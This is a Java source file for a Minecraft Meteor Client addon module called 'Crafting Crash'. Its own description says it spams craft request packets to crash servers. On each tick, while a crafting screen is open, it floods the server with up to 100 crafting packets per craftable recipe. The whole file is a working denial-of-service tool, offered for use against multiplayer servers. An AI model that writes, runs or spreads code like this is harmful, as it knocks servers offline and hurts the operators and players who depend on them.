package im.hira.tweaks.modules.Crash;
import im.hira.tweaks.MCM4MC;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.recipe.NetworkRecipeId;
import net.minecraft.recipe.RecipeDisplayEntry;
import net.minecraft.screen.CraftingScreenHandler;

import java.util.List;

public class CraftingCrash extends Module {

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packetCount = sgGeneral.add(new IntSetting.Builder()
        .name("packet-count")
        .description("Number of craft request packets to send per recipe.")
        .defaultValue(25)
        .min(1)
        .max(100)
        .sliderRange(1, 100)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables the module when you disconnect or leave the world.")
        .defaultValue(true)
        .build()
    );

    public CraftingCrash() {
        super(MCM4MC.JH_CRASH_CAT, "Crafting Crash", "Spams craft request packets to crash servers. Use with planks in inventory for best results.");
    }

    @EventHandler
    private void onTickPost(TickEvent.Post event) {
        if (mc.player == null || mc.world == null || !(mc.player.currentScreenHandler instanceof CraftingScreenHandler) || mc.getNetworkHandler() == null) {
            return;
        }

        try {
            List<RecipeResultCollection> recipeResultCollectionList = mc.player.getRecipeBook().getOrderedResults();
            for (RecipeResultCollection recipeResultCollection : recipeResultCollectionList) {
                for (RecipeDisplayEntry entry : recipeResultCollection.getAllRecipes()) {
                    if (recipeResultCollection.isCraftable(entry.id())) { // Filter craftable recipes
                        for (int i = 0; i < packetCount.get(); i++) {
                            mc.getNetworkHandler().sendPacket(new CraftRequestC2SPacket(mc.player.currentScreenHandler.syncId, entry.id(), true));
                        }
                    }
                }
            }
        } catch (Exception e) {
            ChatUtils.error("Stopping crash because an error occurred: " + e.getMessage());
            toggle();
        }
    }

    @EventHandler
    private void onTickPre(TickEvent.Pre event) {
        if (autoDisable.get() && (mc.world == null || mc.player == null)) {
            toggle();
        }
    }
}
